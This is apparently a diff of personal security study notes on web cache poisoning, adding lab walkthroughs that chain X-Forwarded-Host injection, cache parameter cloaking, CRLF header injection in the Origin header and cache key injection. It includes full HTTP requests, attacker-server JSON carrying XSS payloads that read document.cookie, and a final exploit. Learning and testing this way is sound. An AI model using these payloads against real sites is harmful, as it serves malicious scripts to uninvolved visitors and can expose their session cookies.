@@ -1,12 +1,10 @@
 >[!question] What is Web Cache Poisoning?
 >Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users.
 
-# Web Cache Poisoning Attacks
+# Basic discovery process 
 
 >[!info] Pre-requisites:
->- [Web Cache Attacks](Web%20Cache%20Attacks.md)
-
-## Basic discovery process 
+>- [Web Cache](Web%20Cache.md)
 
 1. **Identify and evaluate unkeyed inputs**
    
@@ -19,10 +17,12 @@
 2. **Elicit a harmful response from the back-end server**
    
    Once you have identified an unkeyed input, the next step is to evaluate exactly how the website processes it. Understanding this is essential to successfully eliciting a harmful response. If an input is reflected in the response from the server without being properly sanitized, or is used to dynamically generate other data, then this is a potential entry point for web cache poisoning.
-   
-3. **Get the response cached**
-   
+<br>
+3. **Get the response cached**:
+
    Whether or not a response gets cached can depend on all kinds of factors, such as the file extension, content type, route, status code, and response headers. You will probably need to devote some time to simply playing around with requests on different pages and studying how the cache behaves. Once you work out how to get a response cached that contains your malicious input, you are ready to deliver the exploit to potential victims.
+
+# Web Cache Poisoning Attacks
 
 ## XSS attacks using web cache poisoning
 
@@ -91,123 +91,24 @@ The home page loads the tracking javascript for any user visiting the page:
 
 Caching the redirection to the attacker site it is possible to poison all the user visiting the home page, redirecting them to a malicious javascript file.
 
-## Using web cache poisoning to exploit DOM-based vulnerabilities
+## Exploiting cache implementation flaws
 
-Many websites use JavaScript to fetch and process additional data from the back-end. If a script handles data from the server in an unsafe way, this can potentially lead to all kinds of [DOM-based vulnerabilities](DOM-based%20vulnerabilities.md).
-
-An attacker could poison the cache with a response that imports a JSON file containing the following payload:
-```json
-{"someProperty" : "<svg onload=alert(1)>"}
-```
-
-If the website then passes the value of this property into a **sink** that supports dynamic code execution, the payload would be executed in the context of the victim's browser session. If you use web cache poisoning to make a website load malicious JSON data from your server, you may need to grant the website access to the JSON using [Cross-origin resource sharing (CORS)](Cross-origin%20resource%20sharing%20(CORS).md).
-
-```http
-HTTP/1.1 200 OK
-Content-Type: application/json
-Access-Control-Allow-Origin: *
-
-{
-    "malicious json" : "malicious json"
-}
-```
-
-# Exploiting cache implementation flaws
-
-You can access a much greater attack surface for web cache poisoning by exploiting quirks in specific implementations of caching systems. In particular, we'll look at why flaws in how cache keys are generated can sometimes leave websites vulnerable to cache poisoning via separate vulnerabilities that are traditionally considered unexploitable. We'll also show how you can take classic techniques even further to potentially poison application-level caches, often with devastating results.
-
-## Cache key flaws
-
-Websites take most of their input from the **URL path and the query string**. However, as the request line is usually part of the cache key, **these inputs have traditionally not been considered suitable for cache poisoning**. Any payload injected via keyed inputs would act as a cache buster, meaning your poisoned cache entry would almost certainly never be served to any other users.
-
-On closer inspection, however, the **behavior of individual caching systems is not always as you would expect**. In practice, many websites and CDNs perform **various transformations on keyed components when they are saved in the cache key.** This can include:
-- Excluding the query string
-- Filtering out specific query parameters
-- Normalizing input in keyed components
-
-These transformations may introduce a few **unexpected quirks**. These are primarily **based around discrepancies between the data that is written to the cache key and the data that is passed into the application code**, even though it all stems from the same input. 
-
-## Methodology
+You can access a much greater attack surface for web cache poisoning by **exploiting quirks in specific implementations of caching systems**. In particular, we'll look at why [flaws in how cache keys are generated](Web%20Cache.md#Cache%20key%20flaws) can sometimes leave websites vulnerable to cache poisoning via separate vulnerabilities that are traditionally considered unexploitable. 
 
 These newer techniques rely on flaws in the specific implementation and configuration of the cache, which may vary dramatically from site to site. This means that you need a deeper understanding of the target cache and its behavior. 
 
 The methodology involves the following steps:
-- Identify a suitable cache oracle
-- Probe key handling
-- Identify an exploitable gadget
+- [Identify a suitable cache oracle](Web%20Cache%20Implementation%20flaws.md#Identify%20a%20suitable%20cache%20oracle)
+- [Probe key handling](Web%20Cache%20Implementation%20flaws.md#Probe%20key%20handling)
+- [Identify an exploitable gadget](Web%20Cache%20Implementation%20flaws.md#Identify%20an%20exploitable%20gadget)
 
-### Identify a suitable cache oracle
+#### Unkeyed port
 
-A **cache oracle is simply a page or endpoint that provides feedback about the cache's behavior**. This needs to be cacheable and must indicate in some way whether you received a cached response or a response directly from the server. (HTTP headers, observable changes to dynamic content, distinct resone times, etc.).
-
-Ideally, the cache oracle will also reflect the entire URL and at least one query parameter in the response. This will make it easier to notice parsing discrepancies between the cache and the application, which will be useful for constructing different exploits later.
-
-If you can identify that a specific third-party cache is being used, you can also consult the corresponding documentation. For example, Akamai-based websites may support the header `Pragma: akamai-x-get-cache-key`, which you can use to display the cache key in the response headers:
-
-```http
-GET /?param=1 HTTP/1.1
-Host: innocent-website.com
-Pragma: akamai-x-get-cache-key
-
-HTTP/1.1 200 OK
-X-Cache-Key: innocent-website.com/?param=1
-```
-
-### Probe key handling
-
-The next step is to **investigate whether the cache performs any additional processing** of your input when generating the cache key. You are looking for an additional attack surface hidden within seemingly keyed components. Specifically look at any transformation that is taking place. Is anything being excluded from a keyed component when it is added to the cache key? Common examples are excluding specific query parameters, or even the entire query string, and removing the port from the `Host` header.
-
->[!example]
->Hypothetical cache oracle is the target website's home page. This automatically redirects users to a region-specific page. It uses the Host header to dynamically generate the Location header in the response.
-
-```http
-GET / HTTP/1.1
-Host: vulnerable-website.com
-
-HTTP/1.1 302 Moved Permanently
-Location: https://vulnerable-website.com/en
-Cache-Status: miss
-```
-
-To test whether the port is excluded from the cache key, we first need to request an arbitrary port and make sure that we receive a fresh response from the server that reflects this input:
-
-```http
-GET / HTTP/1.1
-Host: vulnerable-website.com:1337
-
-HTTP/1.1 302 Moved Permanently
-Location: https://vulnerable-website.com:1337/en
-Cache-Status: miss
-```
-
-Next, we'll send another request, but this time we won't specify a port:
-
-```http
-GET / HTTP/1.1
-Host: vulnerable-website.com
-
-HTTP/1.1 302 Moved Permanently
-Location: https://vulnerable-website.com:1337/en
-Cache-Status: hit
-```
-
-Although the `Host` header is keyed, the way it is transformed by the cache allows us to pass a payload into the application while still preserving a "normal" cache key that will be mapped to other users' requests. This kind of behavior is the key concept behind all of the exploits.
-
-### Identify an exploitable gadget
-
-The final step is to identify a suitable gadget that you can chain with this cache key flaw. This is an important skill because the severity of any web cache poisoning attack is heavily dependent on the gadget you are able to exploit.
-
-These gadgets will often be classic client-side vulnerabilities, such as [Cross-Site Scripting (XSS)](Cross-Site%20Scripting%20(XSS).md) and [Open Redirection](Open%20Redirection.md). By combining these with web cache poisoning, you can massively escalate the severity of these attacks, turning a reflected vulnerability into a stored one. Instead of having to induce a victim to visit a specially crafted URL, your payload will automatically be served to anybody who visits the ordinary, perfectly legitimate URL.
-
-## Common unkeyed elements
-
-### Unkeyed port
-
-### Unkeyed query string
+#### Unkeyed query string
 
 To identify a dynamic page, you would normally observe how changing a parameter value has an effect on the response. But if the query string is unkeyed, most of the time you would still get a cache hit, and therefore an unchanged response, regardless of any parameters you add. Clearly, this also makes classic cache-buster query parameters redundant.
   
-### Unkeyed query parameters
+#### Unkeyed query parameters
 
 Some websites only exclude specific query parameters that are not relevant to the back-end application, such as parameters for analytics or serving targeted advertisements.
   
@@ -242,7 +143,7 @@ Content-Length: 9867
 <link rel="canonical" href='//0af8004f04d10d9cc26dfc40003a00d1.web-security-academy.net/?utm_content='/><script>alert(1)</script>
 ```
 
-### Cache parameter cloaking
+#### Cache parameter cloaking
 
 **Cloaking using the query-string delimiter**
 
@@ -296,7 +197,7 @@ X-HTTP-Method-Override: POST
 param=bad-stuff-here
 ```
 
-### Normalized cache keys
+#### Normalized cache keys
 
 Any normalization applied to the cache key can also introduce exploitable behavior. In fact, it can occasionally enable some exploits that would otherwise be almost impossible.
 
@@ -313,7 +214,7 @@ If you send a malicious request using Burp Repeater, you can poison the cache wi
 As a result, the cache will serve the poisoned response and the payload will be executed client-side. You just need to make sure that the cache is poisoned when the victim visits the URL.
 
 
-### Cache key injection
+#### Cache key injection
 
 You will sometimes discover a client-side vulnerability in a keyed header. This is also a classic "unexploitable" issue that can sometimes be exploited using cache poisoning.
 
@@ -343,7 +244,7 @@ X-Cache: hit
 <script>…'-alert(1)-'…</script>
 ```
 
-### Internal cache poisoning
+## Internal cache poisoning
 
 Some websites implement caching behavior directly into the application in addition to using a distinct, external component. This can have several advantages, such as avoiding the kind of parsing discrepancies we looked at earlier. 
 
@@ -358,6 +259,346 @@ This will often only require you to use basic web cache poisoning techniques, su
 >
 >- If the response reflects a mixture of both input from the last request you sent and input from a previous request, this is a key indicator that the cache is storing fragments rather than entire responses. The same applies if your input is reflected in responses on multiple distinct pages, in particular on pages in which you never tried to inject your input.
 >- The cache's behavior may simply be so unusual that the most logical conclusion is that it must be a unique and specialized internal cache.
+
+---
+
+# Vulnerability chain involving Web Cache Poisoning
+
+## Host Header Injection + Web Cache Poisoning + DOM XSS
+
+Many websites use JavaScript to fetch and process additional data from the back-end. If a script handles data from the server in an unsafe way, this can potentially lead to all kinds of [DOM-based vulnerabilities](DOM-based%20vulnerabilities.md).
+
+If the website then passes the value of this property into a **sink** that supports dynamic code execution, the payload would be executed in the context of the victim's browser session. If you use web cache poisoning to make a website load malicious JSON data from your server, you may need to grant the website access to the JSON using [Cross-origin resource sharing (CORS)](Cross-origin%20resource%20sharing%20(CORS).md).
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+Access-Control-Allow-Origin: *
+
+{"country": "<img src=1 onerror=alert(document.cookie)>"}
+```
+
+Discovered a [Host Header](Host%20Header%20attacks.md) injection causing the server to cache a different host:
+```http
+GET /product?productId=1&foo=c HTTP/1.1
+Host: 0a2300630300763180745d5f008e00f5.web-security-academy.net
+X-Forwarded-Host: 0xbro.com
+
+HTTP/1.1 200 OK
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+
+<script>
+	data = {
+		"host":"0xbro.com",
+		"path":"/product",
+	}
+</script>
+...
+<script>
+	initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
+</script>
+```
+
+`initGeoLocate()` contains a sink whose data can be controlled using the cache poisoning:
+```js
+function initGeoLocate(jsonUrl)
+{
+    fetch(jsonUrl)
+        .then(r => r.json())
+        .then(j => {
+            let geoLocateContent = document.getElementById('shipping-info');
+
+            let img = document.createElement("img");
+            img.setAttribute("src", "/resources/images/localShipping.svg");
+            geoLocateContent.appendChild(img)
+
+            let div = document.createElement("div");
+            div.innerHTML = 'Free shipping to ' + j.country; // {"country": "United Kingdom"}
+            geoLocateContent.appendChild(div)
+        });
+}
+```
+
+Served the malicious payload on the attacker's server (`/resources/json/geolocate.json`):
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+Access-Control-Allow-Origin: *
+
+{"country": "<img src=1 onerror=alert(document.cookie)>"}
+```
+![](../../zzz_res/attachments/DOM-XSS-from-cache.png)
+
+## Host Header Injection + Web Cache Poisoning + Arbitrary Cookie Set + DOM XSS
+
+Discovered a [Host Header Injection](Host%20Header%20attacks.md) causing the server to cache a different host:
+```html
+GET / HTTP/1.1
+Host: 0aca005504fea6bb81c1c683009c0050.web-security-academy.net
+x-forwarded-host: exploit-0a2c005f048da6408158c54201190023.exploit-server.net
+
+
+HTTP/1.1 200 OK
+<script>
+	data = {
+		"host":"exploit-0a2c005f048da6408158c54201190023.exploit-server.net",
+		"path":"/",
+	}
+</script>
+...
+<script type="text/javascript" src="\resources\js\translations.js"></script>
+...
+<form>
+	<select id=lang-select onchange="((ev) => { ev.currentTarget.parentNode.action = '/setlang/' + ev.target.value; ev.currentTarget.parentNode.submit(); })(event)">
+	</select>
+</form>
+...
+<script>
+	initTranslations('//' + data.host + '/resources/json/translations.json');
+</script>
+```
+
+Discovered the `X-Original-URL` is supported:
+```http
+GET / HTTP/1.1
+Host: 0aeb00c2044baa0e81c5200600a7007f.web-security-academy.net
+x-forwarded-host: exploit-0ab8008104a2aaac81651f59016600cc.exploit-server.net
+X-Original-URL: /setlang/0xbro?
+Connection: close
+
+
+HTTP/1.1 302 Found
+Location: /?localized=1
+Cache-Control: private
+Set-Cookie: lang=0xbro; Path=/; Secure
+```
+
+Detected an arbitrary cookie set vulnerability (noticed that the `?localized=1` works as a cache buster):
+```http
+GET /setlang/foo? HTTP/1.1
+Host: 0aca005504fea6bb81c1c683009c0050.web-security-academy.net
+
+HTTP/1.1 302 Found
+Location: /?localized=1
+Cache-Control: private
+Set-Cookie: lang=foo; Path=/; Secure
+```
+
+`/resources/js/translations.js` contains a sink whose data can be controlled using the arbitrary cookie set:
+```js
+function initTranslations(jsonUrl)
+{
+    ...
+
+    fetch(jsonUrl)
+        .then(r => r.json())
+        .then(j => {
+            const select = document.getElementById('lang-select');
+            if (select) {
+                for (const code in j) {
+                    const name = j[code].name;
+                    const el = document.createElement("option");
+                    el.setAttribute("value", code);
+                    el.innerText = name; // this value is retrieved by the JSON from the server --> {"0xbro": {"name": "foo"}}
+                    select.appendChild(el);
+                    if (code === lang) {
+                        select.selectedIndex = select.childElementCount - 1;
+                    }
+                }
+            }
+...
+}
+```
+
+PoC 
+
+Set `/resources/json/translations.json` with a malicious payload and a specific key(`0xbro`):
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Access-Control-Allow-Origin: *
+
+{
+    "en": {
+        "name": "<img src onerror=alert(document.cookie)>"
+    },
+    "0xbro": {
+        "name": "<img src onerror=alert(document.cookie)>",
+        "translations": {
+            "Return to list": "<img src onerror=alert(document.cookie)>",
+            "View details": "<img src onerror=alert(document.cookie)>",
+            "Description:": "<img src onerror=alert(document.cookie)>"
+        }
+    }
+}
+```
+
+Poisoned the server the first time in order to set the arbitrary cookie value.
+>[!warning]
+>I used `/setlang\0xbro?` because `/setlang/0xbro?` sets cookies and cannot be cached. `/setlang\0xbro` instead is normalized by the server and also cached:
+
+```http
+GET / HTTP/1.1
+Host: 0aeb00c2044baa0e81c5200600a7007f.web-security-academy.net
+x-forwarded-host: exploit-0ab8008104a2aaac81651f59016600cc.exploit-server.net
+X-Original-URL: /setlang\0xbro?
+Connection: close
+
+
+HTTP/1.1 302 Found
+Location: /setlang/0xbro
+ache-Control: max-age=30
+Age: 2
+X-Cache: hit
+```
+
+Poisoned the redirect page in order to retrieved the poisoned JSON:
+```http
+GET /?localized=1 HTTP/1.1
+Host: 0aeb00c2044baa0e81c5200600a7007f.web-security-academy.net
+x-forwarded-host: exploit-0ab8008104a2aaac81651f59016600cc.exploit-server.net
+Connection: close
+
+
+<script>
+	data = {
+		"host":"exploit-0ab8008104a2aaac81651f59016600cc.exploit-server.net",
+		"path":"/",
+	}
+</script>
+```
+
+Every user visiting the home page is redirected to the second poisoned page (while the arbitrary language is set), where the malicious JSON is downloaded:
+![](../../zzz_res/attachments/Double-poisoning-XSS.png)
+
+## Cache Parameter Cloaking + HTTP Param Pollution + Header Injection + Cache Key Injection 
+
+Redirection chain:
+```http
+GET / HTTP/1.1
+Pragma: x-get-cache-key
+
+
+HTTP/1.1 302 Found
+Location: /login?lang=en
+X-Cache-Key: /$$
+
+---
+
+GET /login?lang=en HTTP/1.1
+Pragma: x-get-cache-key
+Origin: test.com
+
+
+HTTP/1.1 302 Found
+Location: /login/?lang=en
+X-Cache-Key: /login?lang=en$$Origin=test.com
+
+---
+
+GET /login/?lang=asd HTTP/1.1
+Pragma: x-get-cache-key
+
+
+HTTP/1.1 200 OK
+
+<link rel="canonical" href='//0a3c0044037d28bd8061ee010087006f.web-security-academy.net/login/?lang=asd'/>
+...
+<script src='/js/localize.js?lang=asd&cors=0'></script>
+
+---
+
+GET /js/localize.js?lang=asd&cors=0 HTTP/1.1
+Pragma: x-get-cache-key
+
+
+HTTP/1.1 200 OK
+X-Cache-Key: /js/localize.js?lang=asd&cors=0$$
+
+document.cookie = 'lang=asd';
+
+```
+
+>[!bug] Vuln #1: [Cache parameter cloaking](Web%20Cache%20Poisoning.md#Cache%20parameter%20cloaking)
+>`/login` excludes the parameter `utm_content` from the cache key using a flawed regex.
+>```http
+>GET /login?lang=en HTTP/1.1
+>Pragma: x-get-cache-key
+>
+>HTTP/1.1 302 Found
+>Location: /login/?lang=en
+>X-Cache-Key: /login?lang=en$$
+>
+>---
+>
+>GET /login?lang=en?utm_content=bar HTTP/1.1
+>Pragma: x-get-cache-key
+>
+>HTTP/1.1 302 Found
+Location: /login/?lang=en
+X-Cache-Key: /login?lang=en$$
+>```
+
+>[!bug] Vuln #2: [HTTP Parameter Pollution (HPP)](HTTP%20Parameter%20Pollution%20(HPP).md)
+>`/login/` imports a JavaScript file passing the same parameters used by the request. In this way arbitrary parameters can be passed to the script.
+>
+>*/login/?lang=en?utm_content=bar*
+>```html
+>...
+> <script src='/js/localize.js?lang=en?utm_content=bar&cors=0'></script>
+> ...
+>```
+
+>[!bug] Vuln #3: Header Injection using `Oring` + Cache Key Injection
+>The application sets and caches arbitrary Origins when `cors=1`. The same cache key set when the origin is used can also be obtained using only HTTP GET parameters:
+>```http
+>GET /js/localize.js?lang=en?foo=bar&cors=1 HTTP/1.1
+Host: 0ace00a30364b16c80e7b8ec0017003c.web-security-academy.net
+Origin: 0xbro.red%0d%0aFoo:%20bar$$
+Pragma: x-get-cache-key
+Connection: close
+>
+>
+>HTTP/1.1 200 OK
+>Access-Control-Allow-Origin: 0xbro.red
+>Foo: bar$$
+>X-Cache-Key: /js/localize.js?lang=en?foo=bar&cors=1$$Origin=0xbro.red%0d%0aFoo:%20bar
+>
+>document.cookie = 'lang=en?foo=bar';
+>
+>
+>GET /js/localize.js?lang=en?foo=bar&cors=1$$Origin=0xbro.red%0d%0aFoo:%20bar HTTP/1.1
+>Pragma: x-get-cache-key
+>
+>HTTP/1.1 200 OK
+>X-Cache-Key: /js/localize.js?lang=en?foo=bar&cors=1$$Origin=0xbro.red%0d%0aFoo:%20bar$$
+>
+>``` 
+
+Final exploit:
+
+```http
+GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/1.1
+Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: x
+X-Cache-Key: /js/localize.js?lang=en?cors=1&x=1$$Origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
+Connection: close
+Content-Length: 8
+
+alert(1)
+
+
+GET /login?lang=en?utm_content=x%26cors=1%26x=1$$Origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/1.1
+
+HTTP/1.1 302 Found
+Location: /login/?lang=en?utm_content=x%26cors=1%26x=1$$Origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23
+X-Cache-Key: /login?lang=en$$
+```
+![](../../zzz_res/attachments/Pasted%20image%2020230702145610.png)
 
 # External Resources
 
